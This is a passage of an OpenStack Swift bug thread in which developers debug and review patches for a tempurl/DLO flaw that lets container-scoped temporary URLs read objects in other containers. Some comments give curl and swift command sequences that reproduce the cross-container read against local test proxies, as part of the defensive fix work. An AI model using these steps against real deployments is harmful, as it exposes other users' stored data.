![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-04: |  |  | [#56](/swift/%2Bbug/1449212/comments/56) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438741/%2Bfiles/disable-get-container-tempurl-cross-container.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438741)
  (91.4 KiB,
  text/plain)

So I'm still not entirely happy with all the get\_\*\_info changes needed to support this fix, but only because I think test test cleanup distracts from the important change of fixing the authorize callback. I definitely approve of this improvement to the environ caching, and I think i'll be much easier on us down the road - so maybe now is as good a time to fix it as any.

To reiterate the other dirty hacks that I've suggested (as opposed to using sam's \*fix\*) were:

a) make the tempurl callback return 401 until container acls are in place - coupling with existing behavior to indirectly prevent the authorize callback pop

b) hijack the `swift.authorize\_override` environ boolean to \*also\* indicate that it's cheap to call authorize and update the base controller to not pop the authorize callback from preauthorized requests' environ.

c) start to fix environ caching to not rely on the proxy server setting the cache in the get\_\*\_info() request environ, and instead use the response directly \*

\* N.B. I think using the get\_\*\_info() response directly (instead of it's requests' environ) to fill in the original requests env cache is actually the correct fix - but when I started down this road the test fall out was about the same as the info\_cache trick (it was starting to look a little worse actually). I found a hack that starts down the path without fully commiting to removing the request environ caching junk that I thought was ok. I'll attach that one separately.

So I'm still not entirely happy with all the get\_\*\_info changes needed to support this fix, but only because I think test test cleanup distracts from the important change of fixing the authorize callback. I definitely approve of this improvement to the environ caching, and I think i'll be much easier on us down the road - so maybe now is as good a time to fix it as any.
To reiterate the other dirty hacks that I've suggested (as opposed to using sam's \*fix\*) were:
a) make the tempurl callback return 401 until container acls are in place - coupling with existing behavior to indirectly prevent the authorize callback pop
b) hijack the `swift.authorize\_override` environ boolean to \*also\* indicate that it's cheap to call authorize and update the base controller to not pop the authorize callback from preauthorized requests' environ.
c) start to fix environ caching to not rely on the proxy server setting the cache in the get\_\*\_info() request environ, and instead use the response directly \*
\* N.B. I think using the get\_\*\_info() response directly (instead of it's requests' environ) to fill in the original requests env cache is actually the correct fix - but when I started down this road the test fall out was about the same as the info\_cache trick (it was starting to look a little worse actually). I found a hack that starts down the path without fully commiting to removing the request environ caching junk that I thought was ok. I'll attach that one separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-04: |  |  | [#57](/swift/%2Bbug/1449212/comments/57) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container-2.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438746/%2Bfiles/disable-get-container-tempurl-cross-container-2.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438746)
  (31.5 KiB,
  text/plain)

This one should be a little shorter, it's the cleanest hack I could come up with - but honestly the smallest possible diff may be a misguided goal since we're not going to need backport this beyond Kilo.

This one should be a little shorter, it's the cleanest hack I could come up with - but honestly the smallest possible diff may be a misguided goal since we're not going to need backport this beyond Kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#58](/swift/%2Bbug/1449212/comments/58) |
| --- | --- | --- | --- |

Clay, I can't apply your patches to master, is there a commit ID I can checkout to apply these patches to for testing?

It looks good as a patch in theory but want to play around with it. So this should make the 'swift.authorize' when run in the proxy to give us a 401 when trying to access if a different container/account right? We seem to wrap the GET and PUT methods of 'swift/proxy/controllers/obj.py with delay\_denial, which looking at the proxy code means it's actually ignoring the result, am I missing something.. you have tests that prove this is not the case.. maybe I'm just confused and maybe my brain isn't as 100% as I thought post Flu.

But testing will simply check this :)

I'm continuing my playing, just wanted to update the bug with my 2 cents.

Clay, I can't apply your patches to master, is there a commit ID I can checkout to apply these patches to for testing?
It looks good as a patch in theory but want to play around with it. So this should make the 'swift.authorize' when run in the proxy to give us a 401 when trying to access if a different container/account right? We seem to wrap the GET and PUT methods of 'swift/proxy/controllers/obj.py with delay\_denial, which looking at the proxy code means it's actually ignoring the result, am I missing something.. you have tests that prove this is not the case.. maybe I'm just confused and maybe my brain isn't as 100% as I thought post Flu.
But testing will simply check this :)
I'm continuing my playing, just wanted to update the bug with my 2 cents.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#59](/swift/%2Bbug/1449212/comments/59) |
| --- | --- | --- | --- |

Lol, ignore that, swift.autherize stuff, I just fail at reading/grepping.. (AKA I'm an idiot). Turns out when doing a search inside of vim, use the US spelling of authorize (not authorise) inside the proxy controllers.

Lol, ignore that, swift.autherize stuff, I just fail at reading/grepping.. (AKA I'm an idiot). Turns out when doing a search inside of vim, use the US spelling of authorize (not authorise) inside the proxy controllers.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#60](/swift/%2Bbug/1449212/comments/60) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container-3.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439609/%2Bfiles/disable-get-container-tempurl-cross-container-3.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439609)
  (31.3 KiB,
  text/plain)

Attached is a rebased version of Clays patch. Applies without a warning on current master (commit 5b24b22).

Currently testing patch.

Attached is a rebased version of Clays patch. Applies without a warning on current master (commit 5b24b22).
Currently testing patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#61](/swift/%2Bbug/1449212/comments/61) |
| --- | --- | --- | --- |

Looks like the patch is still allowing to abuse DLO+container tempurl, for example using the following simple script:

echo 12345 > foo.txt

 swift upload victim-container foo.txt

 swift post -m "temp-url-key: secret" compromised-container

tempurl=`swift-temp-url PUT 60 /v1/AUTH\_test/compromised-container/foo.txt secret`

 curl -i -X PUT <http://127.0.0.1:8080>${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'

tempurl=`swift-temp-url GET 60 /v1/AUTH\_test/compromised-container/foo.txt secret`

 curl -i <http://127.0.0.1:8080>${tempurl}

Or did I get it wrong?

Looks like the patch is still allowing to abuse DLO+container tempurl, for example using the following simple script:
echo 12345 > foo.txt
swift upload victim-container foo.txt
swift post -m "temp-url-key: secret" compromised-container
tempurl=`swift-temp-url PUT 60 /v1/AUTH\_test/compromised-container/foo.txt secret`
curl -i -X PUT http://127.0.0.1:8080${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'
tempurl=`swift-temp-url GET 60 /v1/AUTH\_test/compromised-container/foo.txt secret`
curl -i http://127.0.0.1:8080${tempurl}
Or did I get it wrong?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#62](/swift/%2Bbug/1449212/comments/62) |
| --- | --- | --- | --- |

Thanks for that Christian (rebase),

Hmm it looks like what your doing is right. The patch should be setting the swift.authorize to fail if accessing the other container, unless something else if overwriting swift.authorize later in the pipeline.

I'll have a play and see if it fails for me.

Thanks for that Christian (rebase),
Hmm it looks like what your doing is right. The patch should be setting the swift.authorize to fail if accessing the other container, unless something else if overwriting swift.authorize later in the pipeline.
I'll have a play and see if it fails for me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#63](/swift/%2Bbug/1449212/comments/63) |
| --- | --- | --- | --- |

* [acoles-combined-tempurl-xlo-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439721/%2Bfiles/acoles-combined-tempurl-xlo-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439721)
  (31.8 KiB,
  text/plain)

Did you include the patch from here [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) #15?

I took Christian's patch at #60, manually merged [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) #15 patch (would not apply) and then the scenario at #61 fails because

curl -i -X PUT <http://127.0.0.1:8080>${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'

is disallowed with 400

My combined diff wrt master is attached FYI

Did you include the patch from here https://bugs.launchpad.net/swift/+bug/1453948 #15?
I took Christian's patch at #60, manually merged https://bugs.launchpad.net/swift/+bug/1453948 #15 patch (would not apply) and then the scenario at #61 fails because
curl -i -X PUT http://127.0.0.1:8080${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'
is disallowed with 400
My combined diff wrt master is attached FYI

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#64](/swift/%2Bbug/1449212/comments/64) |
| --- | --- | --- | --- |

I'm getting the same result as you Christian, interestingly the swift.authorze method isn't being overriden so that's good.. but the result is None, so the container check isn't returning a 401 like we suspect.

Here's some sanitised q() output:

handle\_request: id(req.environ['swift.authorize'])=140192181680680

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

  \_\_call\_\_: id(env['swift.authorize'])=140192234245248

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

\_\_call\_\_: id(env['swift.authorize'])=140415816079552

  handle\_request: id(req.environ['swift.authorize'])=140415816079552

  handle\_request: resp=None

NOTE: The function ID stays the same, and the response to the swift.authorize is None

I'm going to look into it further.

I'm getting the same result as you Christian, interestingly the swift.authorze method isn't being overriden so that's good.. but the result is None, so the container check isn't returning a 401 like we suspect.
Here's some sanitised q() output:
handle\_request: id(req.environ['swift.authorize'])=140192181680680
handle\_request: id(req.environ['swift.authorize'])=140192234245248
handle\_request: id(req.environ['swift.authorize'])=140192234245248
\_\_call\_\_: id(env['swift.authorize'])=140192234245248
handle\_request: id(req.environ['swift.authorize'])=140192234245248
\_\_call\_\_: id(env['swift.authorize'])=140415816079552
handle\_request: id(req.environ['swift.authorize'])=140415816079552
handle\_request: resp=None
NOTE: The function ID stays the same, and the response to the swift.authorize is None
I'm going to look into it further.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#65](/swift/%2Bbug/1449212/comments/65) |
| --- | --- | --- | --- |

OK so it seems the swift.authorize method is only being called once, when a subrequest is issued there is no swift.authorize. In fact during debugging directly before <https://github.com/openstack/swift/blob/master/swift/common/middleware/dlo.py#L236> swift.authorize exists in the req object, directly afterwards it doesn't.

If I do something like:

swift\_authorize = req.environ.get('swift.authorize')

  resp\_iter = self.\_app\_call(req.environ)

  req.environ['swift.authorize'] = swift\_authorize

Then it's fixed.. that's as far as I've got, but its midnight here and I need to get up for the meeting early in the morning, so someone can take off from where I left it. By either seeing why its removed from 'self.\_app\_call()', butting my hack in, or placing it somewhere better.

Night.

OK so it seems the swift.authorize method is only being called once, when a subrequest is issued there is no swift.authorize. In fact during debugging directly before https://github.com/openstack/swift/blob/master/swift/common/middleware/dlo.py#L236 swift.authorize exists in the req object, directly afterwards it doesn't.
If I do something like:
swift\_authorize = req.environ.get('swift.authorize')
resp\_iter = self.\_app\_call(req.environ)
req.environ['swift.authorize'] = swift\_authorize
Then it's fixed.. that's as far as I've got, but its midnight here and I need to get up for the meeting early in the morning, so someone can take off from where I left it. By either seeing why its removed from 'self.\_app\_call()', butting my hack in, or placing it somewhere better.
Night.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#66](/swift/%2Bbug/1449212/comments/66) |
| --- | --- | --- | --- |

* [test\_patch.sh](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439846/%2Bfiles/test_patch.sh)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439846)
  (827 bytes,
  text/x-sh)

@Alistair: yes, with that patch applied my test above doesn't work anymore, because putting a DLO with tempurl fails with "The header 'X-Object-Manifest' is not allowed in this tempurl".

However, any existing DLO is still able to read the data. As a user with write permission and knowledge of the container tempurl key I could simply create a new DLO, still reading data in other containers I don't have access to.

Proof of concept attached, succeeding on a clean SAIO environment with both patches applied.

@Alistair: yes, with that patch applied my test above doesn't work anymore, because putting a DLO with tempurl fails with "The header 'X-Object-Manifest' is not allowed in this tempurl".
However, any existing DLO is still able to read the data. As a user with write permission and knowledge of the container tempurl key I could simply create a new DLO, still reading data in other containers I don't have access to.
Proof of concept attached, succeeding on a clean SAIO environment with both patches applied.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#67](/swift/%2Bbug/1449212/comments/67) |
| --- | --- | --- | --- |

* [acoles-tempurl-dlo-functest-mod.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439888/%2Bfiles/acoles-tempurl-dlo-functest-mod.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439888)
  (26.8 KiB,
  text/plain)

@Matt the proxy app removes swift.authorize from env line 398 swift/proxy/server.py:

- for a manifest get from a container tempurl, the first call to swift.authorize is for the manifest which \*is\* in the nontainer scope, so authorize\_same\_container returns None and the proxy removes swift.authorize from env. The subsequent requests to the other container (the segments container) are then not auth'd :(

There is a big in the functional test for this scenario (I think, its late and this is complicated for my small brain!), I will attach a patch which leaves the test test.functional.tests.TestContainerTempurl#test\_GET\_DLO\_outside\_container failing due to above I think.

Patch is against master and based on Christian's rebase onto master in #60 with a change to the func test to reveal a failure case.

@Matt the proxy app removes swift.authorize from env line 398 swift/proxy/server.py:
- for a manifest get from a container tempurl, the first call to swift.authorize is for the manifest which \*is\* in the nontainer scope, so authorize\_same\_container returns None and the proxy removes swift.authorize from env. The subsequent requests to the other container (the segments container) are then not auth'd :(
There is a big in the functional test for this scenario (I think, its late and this is complicated for my small brain!), I will attach a patch which leaves the test test.functional.tests.TestContainerTempurl#test\_GET\_DLO\_outside\_container failing due to above I think.
Patch is against master and based on Christian's rebase onto master in #60 with a change to the func test to reveal a failure case.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#68](/swift/%2Bbug/1449212/comments/68) |
| --- | --- | --- | --- |

First, in comment #67, s/big/bug/ !

Couple of other comments:

1. TestContainerTempurl shouldl remove any account level tempurl keys that have been left in place by other tests, to avoid any coupling of the tempurl scopes being tested.

2. I have a nagging concern about auth\_callback\_same\_container returning None when the path fails to split as expected, havent pinned down a case when that would be bad yet though.

def authorize\_same\_container(account\_to\_match, container\_to\_match):

def auth\_callback\_same\_container(req):

        try:

            \_ver, acc, con, \_rest = req.split\_path(3, 4, True)

        except ValueError:

            return None

^^^^^^^^^^^^^^^^^^ is it relly safe to auth a request when split.path fails??

if acc == account\_to\_match and con == container\_to\_match:

            return None

        else:

            return HTTPUnauthorized(request=req)

return auth\_callback\_same\_container

First, in comment #67, s/big/bug/ !
Couple of other comments:
1. TestContainerTempurl shouldl remove any account level tempurl keys that have been left in place by other tests, to avoid any coupling of the tempurl scopes being tested.
2. I have a nagging concern about auth\_callback\_same\_container returning None when the path fails to split as expected, havent pinned down a case when that would be bad yet though.
def authorize\_same\_container(account\_to\_match, container\_to\_match):
def auth\_callback\_same\_container(req):
try:
\_ver, acc, con, \_rest = req.split\_path(3, 4, True)
except ValueError:
return None
^^^^^^^^^^^^^^^^^^ is it relly safe to auth a request when split.path fails??
if acc == account\_to\_match and con == container\_to\_match:
return None
else:
return HTTPUnauthorized(request=req)
return auth\_callback\_same\_container

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-05: |  |  | [#69](/swift/%2Bbug/1449212/comments/69) |
| --- | --- | --- | --- |

* [clays-56-with-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439955/%2Bfiles/clays-56-with-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439955)
  (27.1 KiB,
  text/plain)

I think the patch in comment #56 is broken. Here's how I tested this stuff:

Test Step 1: saio$ resetswift; startmain

Test Step 2: client$ swift upload victim setup.py setup.cfg AUTHORS # from Swift source tree; any old crap will do

Test Step 3: client$ swift post hacked -m "temp-url-key:conkey"

Test Step 4: curl "<http://192.168.22.144:8080>`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest conkey`" # should 4xx

Test Step 5: client$ swift post -m "temp-url-key:acckey"

Test Step 6: curl "<http://192.168.22.144:8080>`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest acckey`" # should 200

Base commit: 5b24b22

With no patch, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py.

With the patch from comment #56 applied, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py. I was expecting a 400-series error.

Upon inspection, the patch from comment #56 was missing the code to copy the environment before removing swift.authorize (swift.proxy.server.Application.handle\_request). If I add those two lines back in, then Test Step 4 gets a 401, as expected.

The attached patch here is Clay's patch from comment #56, plus the aforementioned two lines of code. I still get unit test failures with this, though.

I think the patch in comment #56 is broken. Here's how I tested this stuff:
Test Step 1: saio$ resetswift; startmain
Test Step 2: client$ swift upload victim setup.py setup.cfg AUTHORS # from Swift source tree; any old crap will do
Test Step 3: client$ swift post hacked -m "temp-url-key:conkey"
Test Step 4: curl "http://192.168.22.144:8080`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest conkey`" # should 4xx
Test Step 5: client$ swift post -m "temp-url-key:acckey"
Test Step 6: curl "http://192.168.22.144:8080`swift tempurl GET 86400 /v1/AUTH\_test/hacked/evil-manifest acckey`" # should 200
Base commit: 5b24b22
With no patch, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py.
With the patch from comment #56 applied, Test Step 4 received a 200 response with a body that was the concatenation of setup.cfg and setup.py. I was expecting a 400-series error.
Upon inspection, the patch from comment #56 was missing the code to copy the environment before removing swift.authorize (swift.proxy.server.Application.handle\_request). If I add those two lines back in, then Test Step 4 gets a 401, as expected.
The attached patch here is Clay's patch from comment #56, plus the aforementioned two lines of code. I still get unit test failures with this, though.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-05: |  |  | [#70](/swift/%2Bbug/1449212/comments/70) |
| --- | --- | --- | --- |

Hrm... maybe having two bugs open wasn't such a great idea. Also maybe this is why smaller changes are better?

So what we \*need\* is to be able to take some Kilo+ sha, and Al's latest patch from lp [bug #1453948](/bugs/1453948) + some patch here that closes all of our issues (#1 PUT tempurl can not create a DLO; #2 cross container DLO 401's with container tempurl).

I found

+ req = Request(req.environ.copy())

in patch number #56 - but it seems like everyone else is building on the hack in #57 that doesn't do sam's info\_cache thing (i.e. #60, #67 and #69) and instead just calls that \_set\_info method again - but was mysteriously missing the environ.copy() line in my original version (i blame a git fail on my part)?

So, if everyone is cool with that general idea of patch #57 - i'll try to wade through the follow on patches and post here with what we need.

Hrm... maybe having two bugs open wasn't such a great idea. Also maybe this is why smaller changes are better?
So what we \*need\* is to be able to take some Kilo+ sha, and Al's latest patch from lp bug #1453948 + some patch here that closes all of our issues (#1 PUT tempurl can not create a DLO; #2 cross container DLO 401's with container tempurl).
I found
+ req = Request(req.environ.copy())
in patch number #56 - but it seems like everyone else is building on the hack in #57 that doesn't do sam's info\_cache thing (i.e. #60, #67 and #69) and instead just calls that \_set\_info method again - but was mysteriously missing the environ.copy() line in my original version (i blame a git fail on my part)?
So, if everyone is cool with that general idea of patch #57 - i'll try to wade through the follow on patches and post here with what we need.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-06: |  |  | [#71](/swift/%2Bbug/1449212/comments/71) |
| --- | --- | --- | --- |

I like the infocache thing. Really, the part I like about it is the part where the proxy doesn't mutate the passed-in environment, but takes a copy and mangles \*that\* instead.

Any time we have a middleware that makes more than one request (DLO, SLO, bulk, versions, symlinks...), we end up with these crappy bugs where the middleware makes a request using some environment, the proxy or a later middleware scribbles all over it, and then our middleware reuses that environment and things blow up. That's what happened here, right?

A) tempurl put swift.authorize in the environment and called the rest of the chain

B) the proxy called swift.authorize and then mutated the environment to remove it, which is okay because nobody else is ever going to re-use this environment for anything ever again /s

C) dlo saw the response was for a manifest and so it made a new environment based on the current environment to go fetch segments

D) the proxy got another request without swift.authorize in it (since the proxy wiped it out in step B) and let the request proceed

E) lots of people spent time typing up 70+ comments on this Launchpad bug

We can either work around this bit of request mutation to fix this specific bug and leave a land mine for ourselves to step on next time, or we can get rid of it now. I'd rather get rid of it now.

Moving all that cache into swift.infocache also makes it easier to eliminate future request-environment mutations as we find them. It lets you make a shallow copy of the environment to mutate, thus saving your caller from you, while still ensuring we don't get the same info from memcache or account/container servers twice. It's taking all that hazardous mutable stuff and sticking it in its own little box, separate from the rest of our unchanging request state.

I like the infocache thing. Really, the part I like about it is the part where the proxy doesn't mutate the passed-in environment, but takes a copy and mangles \*that\* instead.
Any time we have a middleware that makes more than one request (DLO, SLO, bulk, versions, symlinks...), we end up with these crappy bugs where the middleware makes a request using some environment, the proxy or a later middleware scribbles all over it, and then our middleware reuses that environment and things blow up. That's what happened here, right?
A) tempurl put swift.authorize in the environment and called the rest of the chain
B) the proxy called swift.authorize and then mutated the environment to remove it, which is okay because nobody else is ever going to re-use this environment for anything ever again /s
C) dlo saw the response was for a manifest and so it made a new environment based on the current environment to go fetch segments
D) the proxy got another request without swift.authorize in it (since the proxy wiped it out in step B) and let the request proceed
E) lots of people spent time typing up 70+ comments on this Launchpad bug
We can either work around this bit of request mutation to fix this specific bug and leave a land mine for ourselves to step on next time, or we can get rid of it now. I'd rather get rid of it now.
Moving all that cache into swift.infocache also makes it easier to eliminate future request-environment mutations as we find them. It lets you make a shallow copy of the environment to mutate, thus saving your caller from you, while still ensuring we don't get the same info from memcache or account/container servers twice. It's taking all that hazardous mutable stuff and sticking it in its own little box, separate from the rest of our unchanging request state.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-06: |  |  | [#72](/swift/%2Bbug/1449212/comments/72) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch3.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439989/%2Bfiles/tempurl-torgomatic-patch3.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439989)
  (87.9 KiB,
  text/plain)

This is a rebase of the patch from comment #42. I believe it still solves the problem of DLO GET or HEAD requests being able to escape their container, and I believe it still does not address the creation of DLO manifests via tempurl PUT (that's a separate LP bug, though if people want to merge them, fine by me).

This is a rebase of the patch from comment #42. I believe it still solves the problem of DLO GET or HEAD requests being able to escape their container, and I believe it still does not address the creation of DLO manifests via tempurl PUT (that's a separate LP bug, though if people want to merge them, fine by me).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-06: |  |  | [#73](/swift/%2Bbug/1449212/comments/73) |
| --- | --- | --- | --- |

-1

So there was a number of improvements to the tests from patch #42 to #56 - which seems lost in #72. Plus #72 is \*not\* based on the already approved and back-ported patch in lp [bug #1453948](/bugs/1453948).

I discussed this with Sam and he seems sufficiently agitated that he's just going to fix everything.

-1
So there was a number of improvements to the tests from patch #42 to #56 - which seems lost in #72. Plus #72 is \*not\* based on the already approved and back-ported patch in lp bug #1453948.
I discussed this with Sam and he seems sufficiently agitated that he's just going to fix everything.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-06: |  |  | [#74](/swift/%2Bbug/1449212/comments/74) |
| --- | --- | --- | --- |

* [container-tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440490/%2Bfiles/container-tempurl.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440490)
  (30.7 KiB,
  text/plain)

I had a stab at an alternative approach to avoid making any changes to the info caching (not saying they aren't good changes to make, but this avoids making them in this security bug fix). I'm not against the info cache/env copying stuff, I was just trying to find a way to a smaller diff to fix the current bug!

In the attached patch I have tempurl instruct the proxy server to NOT delete 'swift.authorize'. Then have the same scoped callbacks as proposed on previous patches on this thread. That removes the need to copy the request env before popping swift.authorize, cos it never gets popped with tempurl.

The attached patch is based on Clay's patch at #15 on [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948), so apply that one first, then this one and you should have both bugs fixed.

(Another approach which works is to have the tempurl authorize callbacks return not-None on first call (from proxy) then behave normally for subsequent calls. That works because tempurl only targets objects and all object controller methods implement delay\_denial. But I ditched that approach as it depends on the delay\_denial properties not changing below tempurl.)

I had a stab at an alternative approach to avoid making any changes to the info caching (not saying they aren't good changes to make, but this avoids making them in this security bug fix). I'm not against the info cache/env copying stuff, I was just trying to find a way to a smaller diff to fix the current bug!
In the attached patch I have tempurl instruct the proxy server to NOT delete 'swift.authorize'. Then have the same scoped callbacks as proposed on previous patches on this thread. That removes the need to copy the request env before popping swift.authorize, cos it never gets popped with tempurl.
The attached patch is based on Clay's patch at #15 on https://bugs.launchpad.net/swift/+bug/1453948, so apply that one first, then this one and you should have both bugs fixed.
(Another approach which works is to have the tempurl authorize callbacks return not-None on first call (from proxy) then behave normally for subsequent calls. That works because tempurl only targets objects and all object controller methods implement delay\_denial. But I ditched that approach as it depends on the delay\_denial properties not changing below tempurl.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-07: |  |  | [#75](/swift/%2Bbug/1449212/comments/75) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch4.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440773/%2Bfiles/tempurl-torgomatic-patch4.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440773)
  (34.7 KiB,
  text/plain)

Here's Clay's patch from #57 but with the unit tests passing.

There were a few things I had to do to make that work: first, make\_pre\_authed\_env() had to start setting swift\_owner = True in the environment it created. Otherwise, the container controller would unhelpfully filter out the ACLs from a GET or HEAD response, and in the case where the environment's identity was not preserved, get\_container\_info() wouldn't have the ACLs in it.

Second, I had to hack around account GET and HEAD requests when (a) account autocreate is on, and (b) the account does not actually exist. In this case, the proxy caches a 404 result down in GETorHEAD\_base. However, it then returns a 200 or 204 with an empty listing. Thus, if environment identity is not preserved, get\_info() sees a 2xx response and caches it, which breaks a bunch of tests. I hacked around it with some made-up header; better suggestions welcome.

Third and ugliest, I commented out one unit test (last line of test.unit.proxy.server.TestContainerController.test\_HEAD\_GET). That test was asserting stuff about the environment caching behavior when the account doesn't exist and account autocreate is on. I wasn't sure how to keep that working \*and\* keep the other account-autocreate tests working too, and it really doesn't seem too important what we cache in this particular case. Again, suggestions welcome.

Here's Clay's patch from #57 but with the unit tests passing.
There were a few things I had to do to make that work: first, make\_pre\_authed\_env() had to start setting swift\_owner = True in the environment it created. Otherwise, the container controller would unhelpfully filter out the ACLs from a GET or HEAD response, and in the case where the environment's identity was not preserved, get\_container\_info() wouldn't have the ACLs in it.
Second, I had to hack around account GET and HEAD requests when (a) account autocreate is on, and (b) the account does not actually exist. In this case, the proxy caches a 404 result down in GETorHEAD\_base. However, it then returns a 200 or 204 with an empty listing. Thus, if environment identity is not preserved, get\_info() sees a 2xx response and caches it, which breaks a bunch of tests. I hacked around it with some made-up header; better suggestions welcome.
Third and ugliest, I commented out one unit test (last line of test.unit.proxy.server.TestContainerController.test\_HEAD\_GET). That test was asserting stuff about the environment caching behavior when the account doesn't exist and account autocreate is on. I wasn't sure how to keep that working \*and\* keep the other account-autocreate tests working too, and it really doesn't seem too important what we cache in this particular case. Again, suggestions welcome.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-07: |  |  | [#76](/swift/%2Bbug/1449212/comments/76) |
| --- | --- | --- | --- |

Both patches (Sams & Alistairs, #75 and #74) work for me and the outcome is as expected.

I currently tend to favor Sams patch slightly, but basically I'm fine with both - thus 2 times +2.

Both patches (Sams & Alistairs, #75 and #74) work for me and the outcome is as expected.
I currently tend to favor Sams patch slightly, but basically I'm fine with both - thus 2 times +2.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-08-10: |  |  | [#77](/swift/%2Bbug/1449212/comments/77) |
| --- | --- | --- | --- |

